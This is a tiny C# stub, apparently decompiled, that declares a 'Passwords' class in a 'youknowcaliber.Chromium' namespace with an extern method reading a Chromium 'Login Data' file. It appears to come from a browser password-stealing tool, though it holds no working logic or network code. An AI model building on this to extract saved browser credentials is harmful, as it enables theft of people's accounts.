using System.Collections.Generic;

namespace youknowcaliber.Chromium;

internal sealed class Passwords
{
	public static extern List<Password> Get(string sLoginData);

	public extern Passwords();
}
